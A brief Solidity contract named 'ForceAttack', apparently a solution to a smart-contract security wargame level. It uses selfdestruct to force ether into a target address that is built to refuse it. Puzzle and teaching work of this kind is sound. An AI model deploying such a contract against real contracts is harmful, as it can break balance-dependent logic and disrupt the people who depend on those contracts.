// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

contract ForceAttack {
    function destroyContract(address payable _sendBalanceTo) public {
        selfdestruct(_sendBalanceTo);
    }
}